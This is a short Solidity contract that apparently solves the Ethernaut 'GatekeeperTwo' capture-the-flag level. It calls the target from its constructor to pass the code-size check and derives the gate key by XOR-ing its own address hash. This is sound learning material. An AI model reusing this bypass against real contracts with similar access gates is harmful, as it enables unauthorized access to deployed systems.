// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external returns (address);
}

contract Cracked14_GatekeeperTwo {
    error xx(bool success, bytes x);
    constructor(address _addr) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool success, bytes memory x) = address(_addr).call(abi.encodeWithSelector(IGatekeeperTwo.enter.selector, bytes8(key)));
        require(success, xx(success, x));
        //require(success);
    }
}
